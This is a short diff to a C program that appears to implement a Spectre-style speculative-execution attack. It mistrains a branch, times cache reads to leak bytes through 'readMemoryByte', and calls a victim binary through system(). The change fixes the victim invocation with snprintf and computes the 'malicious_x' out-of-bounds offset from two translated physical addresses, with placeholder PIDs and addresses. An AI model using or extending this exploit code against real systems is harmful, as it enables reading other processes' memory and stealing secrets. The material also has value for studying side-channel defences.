@@ -134,7 +134,9 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			x = training_x ^ (x & (malicious_x ^ training_x));
 
 			/* Call the victim! */
-			system("./victim.out " + x);
+			char buffer[50];
+			snprintf(buffer, sizeof(buffer), "./victim %lu ", x);
+			system(buffer);
 		}
 
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -170,15 +172,20 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
 int main(int argc, const char **argv) {
 	pid_t pid;
-	uintptr_t vaddr, paddr = 0;
+	uintptr_t vaddr1, vaddr2, paddr1 = 0, paddr2 = 0;
 	pid = 000;
-	vaddr = 000;
-	if (virt_to_phys_user(&paddr, pid, vaddr)) {
+	vaddr1 = 000;
+	vaddr2 = 000;
+	if (virt_to_phys_user(&paddr1, pid, vaddr1)) {
+		fprintf(stderr, "error: virt_to_phys_user\n");
+		return EXIT_FAILURE;
+	}
+	if (virt_to_phys_user(&paddr2, pid, vaddr2)) {
 		fprintf(stderr, "error: virt_to_phys_user\n");
 		return EXIT_FAILURE;
 	}
 	//
-	size_t malicious_x = (size_t) ((char *) -paddr);
+	size_t malicious_x = (size_t) paddr1 - (size_t) paddr2;
 	int score[2], len = 40;
 	uint8_t value[2];
 	printf("Reading %d bytes:\n", len);
